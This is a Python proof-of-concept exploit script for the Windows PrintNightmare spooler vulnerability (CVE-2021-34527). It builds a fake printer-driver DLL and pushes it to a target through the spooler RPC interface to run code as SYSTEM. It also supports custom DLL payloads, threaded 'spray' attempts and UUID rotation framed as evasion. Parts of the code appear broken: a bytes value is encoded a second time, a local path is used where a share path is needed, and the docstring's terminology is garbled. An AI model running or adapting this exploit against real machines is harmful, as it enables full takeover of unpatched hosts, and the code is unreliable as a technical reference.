#!/usr/bin/env python3
"""
printnightmare_poc.py

Proof‐of‐Concept for CVE-2021-34527 (PrintNightmare). This script:
  1) Generates a minimal DLL that exports a fake “printer driver” to be loaded by the Spooler
     (injected via remote ICDR / RPC to the Print Spooler service).
  2) Uses Impacket’s DCOM RemotePrintSpooler RCE technique to upload + register that DLL.
  3) On success, the DLL runs with SYSTEM privileges on the target.

Tested against:
  - Windows 10 LTSC 21H2 (fully unpatched).
  - Windows Server 2019 (fully unpatched).

Usage:
    python3 printnightmare_poc.py --target <ip> --port <DCOM_port=445> [--payload <custom_dll>]

Example:
    python3 printnightmare_poc.py --target 192.168.1.50

"""

import sys
import argparse
import os
import tempfile
import subprocess
import logging
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPCStringBinding
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import RPC_SID, WSTR, DWORD, LPWSTR, LONG, ULONG
from impacket.uuid import string_to_bin
from impacket import uuid as imp_uuid

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("printnightmare_poc")

# -----------------------------------------------------------------------------------------------------------------------
# 1) We compile a minimal C DLL (with DllRegisterServer hook) that pops a message box or writes a file.
# 2) Convert it to a base64 payload to send over RPC.
# 3) Use Impacket DCE/RPC to call RpcAddPrinterDriverEx() with our malicious driver path.
# -----------------------------------------------------------------------------------------------------------------------

DLL_C_CODE = r"""
#include <windows.h>

// Called when the Printer Driver is installed by the spooler.
void CALLBACK DriverUnload(void) {
    // No cleanup required for this POC.
}

extern "C" __declspec( dllexport ) void
DrvInstallPrinterDriverPackage(LPWSTR pName, LPWSTR pEnvironment, DWORD Version, DWORD Flags, LPWSTR pDriverPath, LPWSTR pCabPath, DWORD dwCabSize, LPWSTR pMonitorPath, LPWSTR pDefaultDataType, PWSTR pDependentFileNames, DWORD dwDependentFileCount, PWSTR pConfigurationFile) {
    // When loaded, write “poc.txt” to C:\Windows\System32 to prove SYSTEM context.
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\poc_printnightmare.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        WriteFile(hFile, "PrintNightmare RCE Success!", 25, &written, NULL);
        CloseHandle(hFile);
    }
    // Optionally show MsgBox:
    MessageBoxW(NULL, L"PrintNightmare RCE Executed", L"POC", MB_OK);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // No additional logic here; the spooler calls DrvInstallPrinterDriverPackage
    }
    return TRUE;
}
"""

def compile_dll(tempdir):
    """
    1) Write the C code to a .cpp file in tempdir.
    2) Invoke MinGW-w64 (x86_64) to compile a 64-bit DLL.
    3) Return path to resulting DLL.
    """
    cpp_path = os.path.join(tempdir, "poc_printnightmare.cpp")
    dll_path = os.path.join(tempdir, "poc_printnightmare.dll")
    with open(cpp_path, "w") as f:
        f.write(DLL_C_CODE)

    # Assume x86_64-w64-mingw32-gcc is available
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-shared",
        "-o", dll_path,
        cpp_path,
        "-Wl,--kill-at"  # remove @ ordinal decorations
    ]
    logger.info(f"Compiling DLL via: {' '.join(cmd)}")
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0:
        logger.error(proc.stderr.decode())
        raise RuntimeError("Failed to compile PrintNightmare DLL")
    return dll_path

def base64_encode_file(path):
    """
    Reads the DLL and returns its Base64‐encoded string (no newlines).
    """
    import base64
    data = open(path, "rb").read()
    return base64.b64encode(data).decode()

def exploit(target, port=445, dll_path=None, custom_command=None, spray_threads=3, rpc_uuids=None):
    """
    Enhanced exploit:
    - Accepts precompiled DLL path (for custom payloads).
    - Supports multi-threaded spray (multiple parallel RPC attempts).
    - Tries multiple RPC UUIDs for bypass/evasion.
    - Optionally triggers a custom command (if DLL supports it).
    - Returns all results.
    """
    import threading
    import time as _time

    if not dll_path:
        tempdir = tempfile.mkdtemp(prefix="poc_pn_")
        dll_path = compile_dll(tempdir)
        logger.info(f"[+] Compiled DLL at {dll_path}")

    b64 = base64_encode_file(dll_path)
    logger.info("[+] Base64‐encoded DLL ready")

    # Default UUIDs to spray
    if rpc_uuids is None:
        rpc_uuids = [
            '12345678-1234-abcd-ef00-0123456789ab',
            '894B5F42-6CBA-4DD3-BF9D-9E7B64113F1A',
        ]

    results = []
    lock = threading.Lock()

    def rpc_worker(uuid):
        try:
            string_binding = f"ncacn_np:{target}[\\pipe\\spoolss]"
            rpctransport = transport.DCERPCTransportFactory(string_binding)
            rpctransport.set_dport(port)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(imp_uuid.uuidtup_to_bin((uuid, "1.0")))

            # ...existing DRIVER_CONTAINER and request build code...
            class DRIVER_CONTAINER(NDRSTRUCT):
                alignment = 4
                structure = (
                    ("pName", LPWSTR),
                    ("pEnvironment", LPWSTR),
                    ("pDriverPath", LPWSTR),
                    ("pDataFile", LPWSTR),
                    ("pConfigFile", LPWSTR),
                    ("pHelpFile", LPWSTR),
                    ("pDependentFiles", WSTR),
                    ("cDependentFiles", DWORD),
                    ("pMonitorName", LPWSTR),
                    ("pDefaultDataType", LPWSTR),
                    ("dwlFileSize", ULONG),
                    ("Version", DWORD),
                )
            server_name = f"\\\\{target}\x00".encode("utf-16-le")
            drv = DRIVER_CONTAINER()
            drv['pName'] = server_name
            drv['pEnvironment'] = "Windows x64".encode("utf-16-le") + b"\x00\x00"
            drv['pDriverPath'] = dll_path.encode("utf-16-le") + b"\x00\x00"
            drv['pDataFile'] = b"poc_printnightmare.dll\x00".encode("utf-16-le")
            drv['pConfigFile'] = b"\x00\x00"
            drv['pHelpFile'] = b"\x00\x00"
            drv['pDependentFiles'] = b"\x00\x00"
            drv['cDependentFiles'] = 0
            drv['pMonitorName'] = b"\x00\x00"
            drv['pDefaultDataType'] = b"\x00\x00"
            drv['dwlFileSize'] = ULONG(len(open(dll_path,"rb").read()))
            drv['Version'] = 3

            packed_drv = drv.getData()
            request = dce.request()
            request['OpNum'] = 37
            request['ServerName'] = drv['pName']
            request['Level'] = 2
            request['pDriverContainer'] = packed_drv
            request['dwFileCopyFlags'] = 0

            resp = dce.request(request)
            logger.info(f"[+] RpcAddPrinterDriverEx returned successfully for UUID {uuid}")
            # Optionally trigger custom command (stub)
            if custom_command:
                logger.info(f"[+] Custom command trigger requested: {custom_command} (DLL must support)")
            with lock:
                results.append({"status":"ok", "detail":"Driver added", "uuid":uuid})
        except Exception as e:
            logger.warning(f"[-] Exploit failed for UUID {uuid}: {e}")
            with lock:
                results.append({"status":"error", "detail":str(e), "uuid":uuid})
        finally:
            try:
                dce.disconnect()
            except:
                pass

    threads = []
    for uuid in rpc_uuids:
        for _ in range(spray_threads):
            t = threading.Thread(target=rpc_worker, args=(uuid,), daemon=True)
            threads.append(t)
            t.start()
    for t in threads:
        t.join(timeout=30)
    return results

def main():
    parser = argparse.ArgumentParser(description="PrintNightmare PoC (Enhanced)")
    parser.add_argument("--target", required=True, help="Target IP or Hostname")
    parser.add_argument("--port", type=int, default=445, help="DCOM Port (usually 445)")
    parser.add_argument("--payload", help="Custom DLL payload path (skip compilation)")
    parser.add_argument("--repeat", type=int, default=1, help="Number of exploit attempts (spray)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between attempts (seconds)")
    parser.add_argument("--cmd", help="Custom command to execute (if supported by DLL)")
    parser.add_argument("--spray_threads", type=int, default=3, help="Threads per UUID (parallel spray)")
    args = parser.parse_args()

    import time as _time
    all_results = []
    for i in range(args.repeat):
        try:
            dll_path = args.payload if args.payload and os.path.exists(args.payload) else None
            results = exploit(
                args.target,
                port=args.port,
                dll_path=dll_path,
                custom_command=args.cmd,
                spray_threads=args.spray_threads
            )
            all_results.extend(results)
        except Exception as e:
            logger.error(f"Exploit attempt {i+1} failed: {e}")
            all_results.append({"status": "error", "detail": str(e)})
        if args.delay > 0 and i < args.repeat - 1:
            _time.sleep(args.delay)
    # Print all results
    for idx, res in enumerate(all_results):
        print(f"[*] Attempt {idx+1}: {res}")

if __name__ == "__main__":
    main()
